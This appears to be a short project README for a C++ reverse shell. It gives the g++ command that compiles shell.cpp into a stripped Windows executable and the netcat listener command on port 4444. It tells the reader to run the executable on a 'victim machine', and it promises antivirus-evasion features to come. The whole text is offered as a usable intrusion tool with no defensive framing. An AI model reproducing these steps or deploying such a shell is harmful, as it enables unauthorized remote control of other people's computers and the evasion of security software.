# CPP-Reverse-Shell

Compile it 
![image](https://user-images.githubusercontent.com/96126679/181670089-03f80a6e-abdf-4c2b-837b-d4f3bdfdf464.png)

```
g++ shell.cpp -o shell.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

then listen For the SHELL 

![image](https://user-images.githubusercontent.com/96126679/181670753-1101e02d-c53b-468d-ae60-d1ef99fd58ac.png)

```
nc -lvp 4444

```

then run the exe on the victem Machine 

then Voila.

![image](https://user-images.githubusercontent.com/96126679/181671006-b19239e2-7fd5-46d0-83ef-f45d7741e743.png)


I am adding evasion techniques to Bypass AV Engines Soon ISA.
